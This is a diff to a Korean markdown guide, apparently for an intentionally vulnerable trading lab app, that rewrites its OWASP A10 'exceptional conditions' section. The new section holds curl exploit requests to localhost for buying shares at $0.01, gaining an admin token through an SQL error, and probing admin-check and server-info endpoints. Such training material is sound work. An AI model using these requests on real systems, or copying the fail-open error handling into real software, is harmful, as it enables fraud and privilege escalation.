@@ -311,18 +311,62 @@ docker logs module_project-backend-1 | grep password
 
 ---
 
-### A10: Exceptional Conditions
+### A10: Exceptional Conditions (현실적 시나리오)
 
-**취약점**: 에러 상황에서 시스템 정보 노출 또는 인증 우회
+**취약점**: 예외 상황에서 비즈니스 로직 우회
+
+#### 🔥 시나리오 1: 무료로 주식 구매하기
+
+**상황**: 시세 조회 API 에러 발생 시 가격이 $0.01로 설정됨
+
+```bash
+# 특수문자가 포함된 심볼로 시세 조회 에러 유발
+# API가 실패하면 가격이 $0.01이 되어 사실상 무료 구매!
+
+# 1. 로그인하여 토큰 획득
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"user1@example.com","password":"password123"}' | jq -r '.token')
+
+# 2. 특수문자 포함 심볼로 주문 (시세 조회 실패 → $0.01 적용)
+curl -X POST http://localhost:5000/api/trade/order \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"symbol": "AAPL$HACK", "side": "buy", "quantity": 10000}'
+# 결과: $0.01 × 10000 = $100에 10000주 구매 성공!
+```
+
+#### 🔥 시나리오 2: DB 에러로 관리자 로그인
+
+**상황**: 로그인 시 DB 에러 발생하면 비상 관리자 권한 부여
+
+```bash
+# SQL 에러를 유발하는 입력
+curl -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "'"'"'", "password": "anything"}'
+# 응답: {"message": "Emergency login granted", "debug": "DB_ERROR_BYPASS_ACTIVATED"}
+# 관리자 토큰이 발급됨!
+```
+
+#### 🔥 시나리오 3: 잔고 조회 실패 시 무제한 구매
+
+**상황**: 잔고 확인 중 에러 발생 시 무제한 잔고로 처리됨
+
+```bash
+# 정상적으로는 잔고 부족 시 거래 거부
+# 하지만 DB 에러 발생 시 잔고가 999,999,999,999로 처리되어 무제한 구매 가능
+# (이 시나리오는 DB 장애 시뮬레이션 필요)
+```
+
+#### 기존 A10 공격도 유효
 
 ```bash
 # 존재하지 않는 사용자 → 에러 → 관리자 권한 부여
 curl "http://localhost:5000/api/utils/admin-check?userId=99999"
-# 응답: {"isAdmin": true, "role": "admin", "debug": "Error bypass activated"}
 
-# 서버 절대 경로 노출
-curl "http://localhost:5000/api/auth/login" -d '{"email":"test"}'
-# 응답에 스택 트레이스 포함
+# 서버 정보 노출
+curl "http://localhost:5000/api/utils/server-info"
 ```
 
 ---
